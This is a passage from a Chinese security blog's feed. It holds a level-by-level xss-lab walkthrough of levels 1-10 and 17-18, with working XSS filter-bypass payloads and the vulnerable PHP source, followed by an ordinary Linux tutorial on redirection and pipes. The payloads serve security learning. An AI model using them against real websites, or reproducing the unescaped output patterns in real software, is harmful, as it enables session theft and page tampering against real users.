class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02= onmouseover=javascript:alert(1)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure><p>要注意的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;</span><br></pre></td></tr></table></figure><p>这个语句是可以拆解的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;embed src=xsf01.swf?&quot; &quot; width=100% heigth=100%&gt;&quot;</span><br></pre></td></tr></table></figure><p>本身就是闭合的，所以不需要构造闭合，所以可以绕过htmlspecialchars该函数，因此，我们输入的才会被当成独立事件属性，不然就需要去构造闭合，而对于htmlspecialchars来说，双引号是特殊处理的，不能用来闭合，就像19关一样</p><h6 id="第18关："><a href="#第18关：" class="headerlink" title="第18关："></a>第18关：</h6><p>与17关是一样的</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure><p>注：第17、18关都可以通过flash xss注入</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://soliym.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab(1-10)详细讲解</title>
    <link href="http://soliym.top/2020/05/06/xss-lab(1-10)%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2020/05/06/xss-lab(1-10)详细讲解/</id>
    <published>2020-05-06T08:26:38.490Z</published>
    <updated>2020-05-06T09:12:45.523Z</updated>
    
    <content type="html"><![CDATA[<h4 id="xss概述"><a href="#xss概述" class="headerlink" title="xss概述"></a>xss概述</h4><p>​    XSS，全称跨站脚本，XSS跨站脚本（Cross-Site Scripting，XSS（与css-层叠样式表冲突，所以命名为xss）），某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要注意的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><a id="more"></a><h4 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h4><p>​    通过xss-lab来学习xss攻击，xss-lab是一个用于学习的平台，需要自己搭建平台</p><p> 1、xss-lab平台搭建</p><p>​    1.1 xss-lab下载地址：</p><p>​        链接：<a href="https://pan.baidu.com/s/1sLh5suCgkNsXKbODJ1T8GA" target="_blank" rel="noopener">https://pan.baidu.com/s/1sLh5suCgkNsXKbODJ1T8GA</a> </p><p>​        提取码：zr17</p><p>​    1.2 搭建平台</p><p>​        使用linux+apache+linux搭建网站，网站的搭建比较简单就不写了</p><p>2、开始学习xss攻击</p><p>​    首先介绍一下xss-lab，xss-lab是一个用于学习xss注入的平台，使用php编写的后台代码，一共有20关，每一    关都有不同的xss注入漏洞，我们要找出漏洞，并且通过漏洞注入代码，方可以通关。</p><p>​    虽然每一关都是不同的，但是注入的方法只有几种，不过涉及的知识点是比较多而且广泛的，大多都是与前    端相关的。xss-lab后面会涉及flash xss攻击，后面将会单独作为章节。</p><p>​    关于涉及到的知识点，会在注入的时候提到</p><h4 id="xss攻击实例"><a href="#xss攻击实例" class="headerlink" title="xss攻击实例"></a>xss攻击实例</h4><h5 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h5><p>get型注，在url中的name字段中输入，输入的内容会在页面回显。显示内容是在html标签之间，所以采用标签注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>弹出消息框，存在xss漏洞</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过get型，获得name参数，然后在注入js代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入之后：</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户&lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>这一关没有任何防护措施</p><p>​    </p><h5 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h5><p>在网页源代码中，我们输入的数据，是在表单中的value属性内，所以需要先闭合input标签，然后在注入代码，闭合标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>第一种方法是通过闭合标签，然后使用脚本代码，另一种是闭合value属性，然后在input标签内加入事件属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(11)</span><br></pre></td></tr></table></figure><p>查看源码：</p><p>在h2标签中有.htmlspecialchars($str)，所以在该地方没有xss注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在input标签中，value属性没有过滤，所以有xss注入漏洞</p><p>本关在h2标签中有防御机制，但是在input中是没有的，所以可以在input中注入</p><h5 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h5><p>输入script,”&lt;”会被转换为html编码，所以这一关无法采用标签，因为标签都是带有”&lt;”的，因此采用事件，需要闭合标签的属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=&apos;alert(1)</span><br></pre></td></tr></table></figure><p>可以通过查看网页的html页面，确定闭合方式，以及是否闭合</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br></pre></td></tr></table></figure><p>所有的地方都被htmlspecialchars函数过滤了，该函数可以过滤“&lt;”“&gt;”““ ”，但是不会过滤单引号，而且value的闭合也是采用单引号，所以会有xss漏洞</p><p>本关所有的地方有都防御机制，所以需要绕过该防御机制，因此采用事件方法，并且使用单引号闭合，这样就可以绕过函数的html实体化</p><h5 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h5><p>先试探防御机制，发现value值中把“&lt;”过滤了，所以采用事件注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br></pre></td></tr></table></figure><p>过滤了尖括号</p><p>本关的防御机制是过滤了，html标签必须采用的“&lt;”，单号没有考虑事件</p><h5 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h5><p>先试探防御机制，这一关把ri转换为r_i，所以考虑绕过该机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>采用大小写同样会被转换，所以换一个不带ri的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 o_nerror=alert(1)</span><br></pre></td></tr></table></figure><p>然后发现on也被过滤了，而且所有的事件属性都是带有on的，所以在此处无法采用事件</p><p>采用其他标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure><p>点击图片就会触发</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br></pre></td></tr></table></figure><p>第一行，将数据转换为小写</p><p>第二行，第二行将script转换</p><p>第三行，将on转换</p><p>本关考虑了标签、及事件的转换，但是没有考虑完整</p><h5 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h5><p>通过试探，和上一关很相似，采用上一关的做法，发现href也被过滤了，但是这一关没有过滤大小写，所有的标签都可以用，只要换成大写，或大小写混合就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot;</span><br><span class="line">&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br></pre></td></tr></table></figure><p>本关对标签，事件都有过滤，但是唯一的漏洞就是没有过滤大小写</p><h5 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h5><p>通过试探，发现script被过滤了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;alert(1)&lt;/&gt;</span><br></pre></td></tr></table></figure><p>所有采用嵌套的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>发现可以使用，然后构造闭合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>采用事件注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;  onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>on被过滤，所以嵌套注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;  oonnclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br></pre></td></tr></table></figure><p>本关与上一关的不同，在于转换后的内容不同，虽然添加了大小写转换，但是因为转换后，字符被转换为空字符，所以转换后的字符如何仍可以组合成，那么就可以绕过该防御机制</p><h5 id="第8关："><a href="#第8关：" class="headerlink" title="第8关："></a>第8关：</h5><p>通过试探，发现无法构造闭合，采用是采用了htmlspecialchars($str)函数，而且闭合方式是双引号，所以input中无法注入，但是在连接里面是有地方可以注入的，首先是试探是否有防御机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr_ipt:alert(1)</span><br></pre></td></tr></table></figure><p>发现与第6关一样，做了过滤，采用html实体编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br></pre></td></tr></table></figure><p>这一关基本过滤了所以关键字和大小写，所以采用html实体编码</p><h5 id="第9关："><a href="#第9关：" class="headerlink" title="第9关："></a>第9关：</h5><p>通过试探，这一关与上一关不同的是会在上一关的基础上，加入地址的检查，首先判断会检查哪些内容，这一关会检查输入的数据中是否会有http：//字段，所以需要在输入的字段中加入该字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&apos;http://&apos;)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">false===strpos($str7,&apos;http://&apos;)</span><br></pre></td></tr></table></figure><p>这一关会检查字段的值</p><h5 id="第10关："><a href="#第10关：" class="headerlink" title="第10关："></a>第10关：</h5><p>这一没有输入的地方，需要在url地址栏中输入，这一时输入是隐藏的，也就是说keyname并不是要注入的地方，真正注入的地方是三个input，不过这三个被隐藏了，所以需要去试探这三个那个是正确的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这一关也会过滤“&lt;”,所以可以绕过，也可以用事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onmouseover=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>但是因为input是隐藏的，所以不会触发事件，需要通过其它方法触发</p><p>采用html的accesskey属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>注意：不同的浏览器有不同的触发方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">火狐是shift+ctrl+x（定义的）</span><br><span class="line">Chrome alt+x</span><br></pre></td></tr></table></figure><p>采用type属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;xss概述&quot;&gt;&lt;a href=&quot;#xss概述&quot; class=&quot;headerlink&quot; title=&quot;xss概述&quot;&gt;&lt;/a&gt;xss概述&lt;/h4&gt;&lt;p&gt;​    XSS，全称跨站脚本，XSS跨站脚本（Cross-Site Scripting，XSS（与css-层叠样式表冲突，所以命名为xss）），某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要注意的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://soliym.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Linux重定向及管道符</title>
    <link href="http://soliym.top/2020/02/02/Linux%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    <id>http://soliym.top/2020/02/02/Linux重定向及管道符/</id>
    <published>2020-02-02T10:35:58.000Z</published>
    <updated>2020-02-02T10:44:49.724Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h4><p>重定向分为输入重定向和输出重定向,输出重定向又分为标椎重定向和错误重新向，输出重定向有分为两种写入格式，清空写入和追加写入</p><a id="more"></a><h5 id="1、重定向分类："><a href="#1、重定向分类：" class="headerlink" title="1、重定向分类："></a>1、重定向分类：</h5><p>输入重定向 &lt;  将文件的内容输入到屏幕中</p><p>输出重定向 &gt;  将命令的结果输出到文件中</p><p>​                  标椎输出重定向  &gt;     将命令的正确信息打印到文件中</p><p>  错误输出重定向 2&gt;   将命令的错误信息打印到文件中</p><h5 id="2、写入格式："><a href="#2、写入格式：" class="headerlink" title="2、写入格式："></a>2、写入格式：</h5><p>​            清空写入 &gt;</p><p> 追加写入 &gt;&gt;</p><p>命令与文件之间桥梁</p><p>各种重定向的命令格式：</p><h5 id="3、输入重定向："><a href="#3、输入重定向：" class="headerlink" title="3、输入重定向："></a>3、输入重定向：</h5><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &lt;   文件</td><td>将文件作为命令的标准输入</td></tr><tr><td>命令   &lt;&lt; 分界符</td><td>从标准输入中读入，直到遇见分界符才停止</td></tr><tr><td>命令 &lt;   文件1 &gt; 文件2</td><td>将文件1作为命令的标准输入并将标准输出到文件2</td></tr></tbody></table><p>例：</p><p>[root@localhost ~]# wc -l &lt; a</p><p>1</p><p>统计a文件中的行数</p><p>[root@localhost ~]# wc -l &lt; a &gt; b</p><p>将上述命令的结果保存到文件b中</p><h5 id="4、输出重定向："><a href="#4、输出重定向：" class="headerlink" title="4、输出重定向："></a>4、输出重定向：</h5><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>命令 &gt;   文件</td><td>将标准输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 2&gt;   文件</td><td>将错误输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令   &gt;&gt; 文件</td><td>将标准输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令   2&gt;&gt; 文件</td><td>将错误输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令   &gt;&gt; 文件 2&gt;&amp;1    或   命令   &amp;&gt;&gt; 文件</td><td>将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</td></tr></tbody></table><h6 id="1）标准重定向-覆盖写入"><a href="#1）标准重定向-覆盖写入" class="headerlink" title="1）标准重定向-覆盖写入"></a>1）标准重定向-覆盖写入</h6><p>[root@localhost ~]# echo helloworld &gt; a</p><p>[root@localhost ~]# cat a</p><p>helloworld</p><h6 id="2）标椎重定向-追加写入"><a href="#2）标椎重定向-追加写入" class="headerlink" title="2）标椎重定向-追加写入"></a>2）标椎重定向-追加写入</h6><p>[root@localhost ~]# echo Linux &gt;&gt; a</p><p>[root@localhost ~]# cat a</p><p>helloworld</p><p>Linux</p><h6 id="3）错误重定向-覆盖写入"><a href="#3）错误重定向-覆盖写入" class="headerlink" title="3）错误重定向-覆盖写入"></a>3）错误重定向-覆盖写入</h6><p>[root@localhost ~]# ll redhat 2&gt; b</p><p>[root@localhost ~]# cat b</p><p>ls: cannot access redhat: No such file or directory</p><h6 id="4）错误重定向-追加写入"><a href="#4）错误重定向-追加写入" class="headerlink" title="4）错误重定向-追加写入"></a>4）错误重定向-追加写入</h6><p>[root@localhost ~]# ll root 2&gt;&gt; b</p><p>[root@localhost ~]# cat b</p><p>ls: cannot access redhat: No such file or directory</p><p>ls: cannot access root: No such file or directory</p><h6 id="5）输出重定向-追加写入"><a href="#5）输出重定向-追加写入" class="headerlink" title="5）输出重定向-追加写入"></a>5）输出重定向-追加写入</h6><p>[root@localhost ~]# ll a &amp;&gt;&gt; a</p><p>[root@localhost ~]# cat a</p><p>helloworld</p><p>Linux</p><p>-rw-r–r–. 1 root root 17 Feb  2 09:24 a</p><p>[root@localhost ~]# ll c &amp;&gt;&gt; a</p><p>[root@localhost ~]# cat a</p><p>helloworld</p><p>Linux</p><p>-rw-r–r–. 1 root root 17 Feb  2 09:24 a</p><p>ls: cannot access c: No such file or directory</p><h4 id="二、管道符"><a href="#二、管道符" class="headerlink" title="二、管道符"></a>二、管道符</h4><p>管道符 |  将前面命令的结果交给后面的命令处理</p><p>命令A |  命令B</p><p>1）例：[root@localhost ~]# grep root /etc/passwd | wc -l</p><p>2</p><p>  匹配包含root的信息，并统计行数</p><p>2）例：</p><p>[root@localhost ~]# ll | head -n 4</p><p>total 16792</p><p>-rw-r–r–. 1 root root      106 Feb  2 09:28 a</p><p>-rw——-. 1 root root     2569 Dec 21 12:14 anaconda-ks.cfg</p><p>-rw-r–r–. 1 root root      102 Feb  2 09:26 b</p><p>如果目录中的文件太多，可以先执行ll命令，然后查看前n行</p><p>3）例：</p><p>[root@localhost ~]# echo redhat | passwd –stdin xixi</p><p>修改密码时通常需要输入两次命令，但是该命令可以一次修改密码，echo 后是密码，–stdin后跟修改的用户名</p><p>注：管道符在一行命令中可以使用多次，可以是多个命令组合使用</p><p>例：</p><p>[root@localhost ~]# ll | head -n 4 | wc -l</p><p>4</p><h4 id="三、通配符"><a href="#三、通配符" class="headerlink" title="三、通配符"></a>三、通配符</h4><p>有时候我们通常会记不清文件的具体名称，但是如果我们知道文件的部分名称，那么我们就可以使用通配符来相似查找文件</p><p>例：</p><p>[root@localhost ~]# ll /dev/sda*</p><p>brw-rw—-. 1 root disk 8, 0 Feb  2 06:48 /dev/sda</p><p>brw-rw—-. 1 root disk 8, 1 Feb  2 06:48 /dev/sda1</p><p>brw-rw—-. 1 root disk 8, 2 Feb  2 06:48 /dev/sda2</p><p>brw-rw—-. 1 root disk 8, 3 Feb  2 06:48 /dev/sda3</p><p>查找所有包含sda的文件</p><p>例：</p><p>[root@localhost ~]# ll /dev/sda[0-9]</p><p>brw-rw—-. 1 root disk 8, 1 Feb  2 06:48 /dev/sda1</p><p>brw-rw—-. 1 root disk 8, 2 Feb  2 06:48 /dev/sda2</p><p>brw-rw—-. 1 root disk 8, 3 Feb  2 06:48 /dev/sda3</p><p>例：</p><p>[root@localhost ~]# ll /dev/sda[a-z]</p><p>ls: cannot access /dev/sda[a-z]: No such file or directory</p><h4 id="四、常见的转义字符"><a href="#四、常见的转义字符" class="headerlink" title="四、常见的转义字符"></a>四、常见的转义字符</h4><p>如果输出的字符是特殊字符，而特殊字符不能输出的时候，就可以用到转义字符</p><p>例：</p><p>[root@localhost ~]# echo $SHELL</p><p>/bin/bash</p><p>如果想在结果前加一个$</p><p>[root@localhost ~]# echo $$SHELL</p><p>3639SHELL</p><p>结果不是我们想要的，多加一个$成了输出bash的PID，因此需要转义字符</p><p>[root@localhost ~]# echo \$$SHELL</p><p>$/bin/bash</p><p>注：两个$$是输出bash的进程号</p><p>[root@localhost ~]# echo $$</p><p>3639</p><p>四个常见的转义字符：</p><p>反斜杠（\）：使反斜杠后面的一个变量变为单纯的字符串。</p><p>单引号（’’）：转义其中所有的变量为单纯的字符串。</p><p>双引号（””）：保留其中的变量属性，与不带“”作用相同</p><p>反引号（<code></code>）：把其中的命令执行后返回结果。</p><p>1、反斜杠前面已经介绍了</p><p>2、单引号是范围内的都按字符串处理</p><p>​      例：</p><p>[root@localhost ~]# echo ‘$SHELL’</p><p>$SHELL</p><p>[root@localhost ~]# echo ‘\$$SHELL’</p><p>\$$SHELL</p><p>可以看出没有进行转换，而是原样输出</p><p>3、双引号</p><p>例：</p><p>[root@localhost ~]# echo “$SHELL”</p><p>/bin/bash</p><p>[root@localhost ~]# echo “\$$SHELL”</p><p>$/bin/bash</p><p>4、反引号</p><p>[root@localhost ~]# echo <code>uname -a</code></p><p>Linux localhost.localdomain 3.10.0-327.el7.x86_64 #1 SMP Thu Oct 29 17:29:29 EDT 2015 x86_64 x86_64 x86_64 GNU/Linux</p><p>命令的结果作为输出</p><h4 id="五、环境变量"><a href="#五、环境变量" class="headerlink" title="五、环境变量"></a>五、环境变量</h4><p>变量是计算机系统用于保存可变值的数据类型。在Linux系统中，变量名称一般都是大写的，这是一种约定俗成的规范。我们可以直接通过变量名称来提取到对应的变量值。Linux系统中的环境变量是用来定义系统运行环境的一些参数，比如每个用户不同的家目录、邮件存放位置等。</p><h5 id="1）命令在Linux中执行的过程"><a href="#1）命令在Linux中执行的过程" class="headerlink" title="1）命令在Linux中执行的过程"></a>1）命令在Linux中执行的过程</h5><p>  （1）判断用户是否以绝对路径或相对路径输入，是则直接执行</p><p>​            例：/bin/ls </p><p>  （2）检查用户输入的命令是否是别名</p><p>  （3）bash解释器判断是内部命令还是外部命令</p><p>  （4）多路径查找用户输入的命令文件</p><h5 id="2）系统中重要的10个环境变量"><a href="#2）系统中重要的10个环境变量" class="headerlink" 